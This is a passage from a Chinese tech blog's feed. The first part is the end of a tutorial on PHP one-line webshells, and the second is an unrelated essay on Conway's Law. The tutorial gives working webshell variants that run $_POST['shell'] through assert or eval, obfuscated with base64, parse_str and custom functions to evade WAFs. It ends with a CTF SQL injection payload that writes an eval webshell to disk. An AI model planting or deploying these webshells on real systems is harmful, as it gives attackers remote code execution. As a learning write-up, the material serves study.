z-double z-php&quot;&gt;assHellert&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-keyword z-operator z-error-control z-php&quot;&gt;@&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-invoke z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;a&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-global z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;_POST&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-php&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;shell&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-php&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-end z-php&quot;&gt;?&amp;gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-html-newline-after-php z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;在第三个参数中查找第一个参数，并将其替换为第二个参数，这里第二个参数为空字符串，相应删除 &lt;code&gt;Hell&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;base64-decode-han-shu&quot;&gt;&lt;code&gt;base64_decode&lt;&#x2F;code&gt; 函数&lt;a class=&quot;zola-anchor&quot; href=&quot;#base64-decode-han-shu&quot; aria-label=&quot;Anchor link for: base64-decode-han-shu&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php z-code&quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-begin z-php&quot;&gt;&amp;lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;a&lt;&#x2F;span&gt;&lt;span class=&quot;z-keyword z-operator z-assignment z-php&quot;&gt;=&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-support z-function z-url z-php&quot;&gt;base64_decode&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-double z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-double z-php&quot;&gt;YXNzZXJ0&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-keyword z-operator z-error-control z-php&quot;&gt;@&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-invoke z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;a&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-global z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;_POST&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-php&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;shell&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-php&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-end z-php&quot;&gt;?&amp;gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-html-newline-after-php z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;&lt;code&gt;YXNzZXJ0&lt;&#x2F;code&gt; 是 &lt;code&gt;assert&lt;&#x2F;code&gt; 的base64编码&lt;&#x2F;p&gt;
&lt;h2 id=&quot;parse-str-han-shu&quot;&gt;&lt;code&gt;parse_str&lt;&#x2F;code&gt; 函数&lt;a class=&quot;zola-anchor&quot; href=&quot;#parse-str-han-shu&quot; aria-label=&quot;Anchor link for: parse-str-han-shu&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php z-code&quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;parse_str(&amp;quot;a=assert&amp;quot;);
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;@$a($_POST[&amp;#39;a&amp;#39;]);
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;生成变量 &lt;code&gt;a&lt;&#x2F;code&gt; 并赋值 &lt;code&gt;assert&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;h2 id=&quot;zi-ding-yi-han-shu&quot;&gt;自定义函数&lt;a class=&quot;zola-anchor&quot; href=&quot;#zi-ding-yi-han-shu&quot; aria-label=&quot;Anchor link for: zi-ding-yi-han-shu&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;pre data-lang=&quot;php&quot; class=&quot;language-php z-code&quot;&gt;&lt;code class=&quot;language-php&quot; data-lang=&quot;php&quot;&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-begin z-php&quot;&gt;&amp;lt;?php&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-meta z-function z-php&quot;&gt;&lt;span class=&quot;z-storage z-type z-function z-php&quot;&gt;function&lt;&#x2F;span&gt; &lt;span class=&quot;z-entity z-name z-function z-php&quot;&gt;fun&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-variable z-parameter z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;a&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-php&quot;&gt;&lt;span class=&quot;z-meta z-block z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-php&quot;&gt;{&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-php&quot;&gt;&lt;span class=&quot;z-meta z-block z-php&quot;&gt;&lt;span class=&quot;z-keyword z-operator z-error-control z-php&quot;&gt;@&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-support z-function z-construct z-php&quot;&gt;eval&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;a&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-php&quot;&gt;&lt;span class=&quot;z-meta z-block z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-php&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;span class=&quot;z-keyword z-operator z-error-control z-php&quot;&gt;@&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-variable z-function z-php&quot;&gt;fun&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-php&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-variable z-other z-global z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-variable z-php&quot;&gt;$&lt;&#x2F;span&gt;_POST&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-php&quot;&gt;[&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-arguments z-php&quot;&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-string z-quoted z-single z-php&quot;&gt;&lt;span class=&quot;z-meta z-string-contents z-quoted z-single z-php&quot;&gt;shell&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-php&quot;&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-item-access z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-php&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function-call z-php&quot;&gt;&lt;span class=&quot;z-meta z-group z-php&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-php&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-expression z-php&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-embedding z-php&quot;&gt;&lt;span class=&quot;z-text z-html z-basic&quot;&gt;&lt;span class=&quot;z-meta z-embedded z-block z-php&quot;&gt;&lt;span class=&quot;z-source z-php&quot;&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-embedded z-end z-php&quot;&gt;?&amp;gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-html-newline-after-php z-php&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;使用自定义函数调用&lt;code&gt;eval&lt;&#x2F;code&gt;&lt;&#x2F;p&gt;
&lt;p&gt;通常都是使用多个组合才能达到绕过 WAF 的目的。&lt;&#x2F;p&gt;
&lt;p&gt;在函数前加 &lt;code&gt;@&lt;&#x2F;code&gt; 符，可让php语句不显示错误信息，加强隐蔽性。&lt;&#x2F;p&gt;
&lt;p&gt;一道简单ctf，是ctfshow里面的：&lt;&#x2F;p&gt;
&lt;p&gt;&lt;img src=&quot;&#x2F;imgs&#x2F;%E4%B8%80%E5%8F%A5%E8%AF%9D%E6%9C%A8%E9%A9%AC%E7%AE%80%E5%8D%95%E5%AD%A6%E4%B9%A0.assets&#x2F;20201202004532573.png&quot; alt=&quot;img&quot; &#x2F;&gt;&lt;&#x2F;p&gt;
&lt;p&gt;可以用payload做，访问txt。当然也可以构造一句话&lt;code&gt;1&#x27;union select &quot;&amp;lt;?php @eval($_POST[&#x27;cmd&#x27;]);?&amp;gt;&quot; into outfile &#x27;C:&#x2F;phpStudy&#x2F;WWW&#x2F;shell.php&#x27;--+&lt;&#x2F;code&gt;来写入一句话木马&lt;&#x2F;p&gt;
</content>
	</entry>
	<entry xml:lang="zh">
		<title>康威定律与软件工程</title>
		<published>2025-04-15T00:00:00+00:00</published>
		<updated>2025-04-15T00:00:00+00:00</updated>
		<link href="https://lbsucceed.github.io/posts/kang-wei-ding-lu-yu-ruan-jian-gong-cheng/" type="text/html"/>
		<id>https://lbsucceed.github.io/posts/kang-wei-ding-lu-yu-ruan-jian-gong-cheng/</id>
		<content type="html">&lt;p&gt;[TOC]&lt;&#x2F;p&gt;
&lt;h1 id=&quot;kang-wei-ding-lu-yu-ruan-jian-gong-cheng&quot;&gt;康威定律与软件工程&lt;a class=&quot;zola-anchor&quot; href=&quot;#kang-wei-ding-lu-yu-ruan-jian-gong-cheng&quot; aria-label=&quot;Anchor link for: kang-wei-ding-lu-yu-ruan-jian-gong-cheng&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h1&gt;
&lt;h2 id=&quot;yi-jian-yao-zhai-yao&quot;&gt;一、简要摘要&lt;a class=&quot;zola-anchor&quot; href=&quot;#yi-jian-yao-zhai-yao&quot; aria-label=&quot;Anchor link for: yi-jian-yao-zhai-yao&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;康威定律（Conway’s Law）是软件工程领域中影响深远的理论之一，最早由计算机科学家 Melvin E. Conway 于 1968 年提出，其核心观点是：&lt;strong&gt;“任何设计系统的组织，其最终产出将不可避免地反映出其内部的沟通结构。”&lt;&#x2F;strong&gt; 这一理论揭示了组织结构与系统架构之间的深层映射关系，即软件产品的结构与功能边界，往往并非完全依据技术需求或最优方案设计，而是高度依赖于开发组织内部的分工方式与沟通机制。&lt;&#x2F;p&gt;
&lt;p&gt;例如，若一个组织由四个小组共同协作开发一款编译器，那么这一编译器的架构极有可能分为四个相互独立的模块，分别对应这四个小组的职责。这种设计并非出于工程逻辑的最优化，而是源于组织结构的现实限制。大量实证研究已证实了这一规律的普遍性。&lt;&#x2F;p&gt;
&lt;p&gt;这种现象背后有着深刻的组织动因。在大型企业中，管理者的地位往往与其团队规模和资源预算挂钩。因此，为了扩大影响力和话语权，管理层倾向于扩充团队规模。这种组织膨胀最终导致项目人员过多，迫使软件架构进行人为的模块划分以“分配任务”。也就是说，&lt;strong&gt;系统结构是被“组织需要”而非“工程需要”所塑造的&lt;&#x2F;strong&gt;。&lt;&#x2F;p&gt;
&lt;p&gt;进一步地，康威定律也解释了为何大型企业的软件系统普遍呈现高度复杂性。除了组织结构膨胀带来的自然架构扩张，软件工程师群体中普遍存在对复杂系统的某种崇拜心理——认为架构越复杂，越能体现技术实力。这导致某些大型公司的复杂系统被误认为是“先进设计”的代表，进而在业界形成一种不良示范。许多中小型项目为追求“对标行业大厂”，盲目模仿其复杂设计，从而陷入了不必要的架构膨胀中，忽视了简洁、高效、可维护才是大多数项目更需要的品质。&lt;&#x2F;p&gt;
&lt;p&gt;因此，理解康威定律不仅有助于识别架构复杂性的根源，也提醒我们在软件系统设计中，不能盲目迁就组织边界，而应主动推动组织与技术架构的良性对齐。本文将从康威定律的理论基础出发，结合 PyTorch 深度学习框架的架构演进与个人开源项目开发实践，探讨这一理论在当代软件工程中的实际应用及其对未来团队协作与系统设计的启发。&lt;&#x2F;p&gt;
&lt;hr &#x2F;&gt;
&lt;h2 id=&quot;er-bei-hou-de-yuan-yin-yu-li-lun-ji-chu&quot;&gt;二、背后的原因与理论基础&lt;a class=&quot;zola-anchor&quot; href=&quot;#er-bei-hou-de-yuan-yin-yu-li-lun-ji-chu&quot; aria-label=&quot;Anchor link for: er-bei-hou-de-yuan-yin-yu-li-lun-ji-chu&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h2&gt;
&lt;p&gt;康威定律（Conway’s Law）最早由美国计算机科学家 Melvin E. Conway 于 1968 年在其论文《How Do Committees Invent?》中提出，核心论断为：&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;“Any organization that designs a system (broadly defined) will produce a design whose structure is a copy of the organization’s communication structure.”
—— Melvin E. Conway, 1968&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;译为中文即：&lt;strong&gt;“任何设计系统（广义）的组织，其最终产出都会反映该组织的沟通结构。”&lt;&#x2F;strong&gt; 这一简洁而深刻的观点，首次从组织行为学的角度揭示了技术系统设计与开发团队沟通模式之间的镜像关系。&lt;&#x2F;p&gt;
&lt;p&gt;尽管 Conway 提出的理论具有很强的直觉性和解释力，但由于当时缺乏实际案例支撑，其论文最初被《哈佛商业评论》拒稿，未能引发广泛关注。直到 1975 年，IBM 资深工程师 Fred Brooks 在其经典著作《The Mythical Man-Month》中引用并延展了康威的思想，结合 IBM OS&#x2F;360 操作系统的开发经验，论证了组织结构对软件架构设计的深远影响，康威定律才逐渐进入软件工程研究与实践者的视野，成为软件架构领域的重要参照。&lt;&#x2F;p&gt;
&lt;p&gt;从理论视角看，康威定律本质上是一种&lt;strong&gt;组织行为与系统设计之间的因果映射模型&lt;&#x2F;strong&gt;，它并非“物理定律”那样的自然规律，而是人类组织运作方式在人造系统上的必然反映。这一思想也得到了现代技术管理领域的高度认可。根据 Splunk 博客对该定律的解读，其核心强调的是：&lt;&#x2F;p&gt;
&lt;blockquote&gt;
&lt;p&gt;组织成员之间如何沟通、如何协作、如何分工，将直接决定他们共同开发的系统最终呈现出来的形式。&lt;&#x2F;p&gt;
&lt;&#x2F;blockquote&gt;
&lt;p&gt;在软件开发过程中，沟通结构的复杂性和清晰度，往往在无形中影响着系统的模块边界、耦合度与职责划分：&lt;&#x2F;p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;沟通顺畅、职责明确的团队&lt;&#x2F;strong&gt;，更容易产出清晰的模块化架构，拥有高度内聚、低耦合、接口明确的系统设计；&lt;&#x2F;li&gt;
&lt;li&gt;&lt;strong&gt;沟通阻塞、组织碎片化的团队&lt;&#x2F;strong&gt;，则往往导致系统内部存在重复逻辑、边界不清晰、职责混乱等问题，降低可维护性。&lt;&#x2F;li&gt;
&lt;&#x2F;ul&gt;
&lt;p&gt;从管理视角来看，大型组织的层级结构和职责划分，必然影响团队之间的沟通方式与信息传递路径。这种结构性沟通成本，在实际项目中会以架构边界的形式“固化”在系统中。例如，一个开发部门与另一个测试部门之间沟通缓慢或壁垒重重，就容易导致测试逻辑在系统架构中被孤立或冗余化。&lt;strong&gt;因此，系统架构并不是完全根据“技术最优”来构建的，而是“现实组织结构的物化反映”。&lt;&#x2F;strong&gt;&lt;&#x2F;p&gt;
&lt;p&gt;此外，管理机制也是康威定律生效的重要驱动力。在许多企业中，尤其是大型企业中，管理者的晋升往往依赖于其团队规模与项目预算。这种现实促使管理者不断扩大团队，从而引发“组织结构膨胀”，导致更多人力需要“被安置”进某个系统模块中，系统架构也因此随之扩展乃至臃肿。这种情况下，系统的复杂性并非技术需求驱动，而是“组织政治”的产物。&lt;&#x2F;p&gt;
